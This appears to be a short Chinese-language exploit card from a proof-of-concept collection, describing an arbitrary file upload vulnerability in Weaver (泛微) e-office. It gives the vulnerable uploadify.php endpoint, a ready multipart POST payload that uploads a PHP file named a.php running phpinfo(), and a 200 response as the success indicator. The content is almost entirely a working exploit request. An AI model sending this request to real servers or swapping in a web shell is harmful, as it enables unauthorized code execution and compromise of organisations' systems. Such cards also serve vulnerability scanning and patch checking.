# 泛微OAe-officeuploadify.php任意文件上传漏洞

泛微OA ｜ 文件上传 ｜ —
- **请求**：`POST /inc/jquery/uploadify/uploadify.php HTTP/1.1`

**Payload**
```
--1
Content-Disposition: form-data; name="Filedata"; filename="a.php"
Content-Type: application/octet-stream
<?php phpinfo();?>
--1--
```
- **响应特征**：200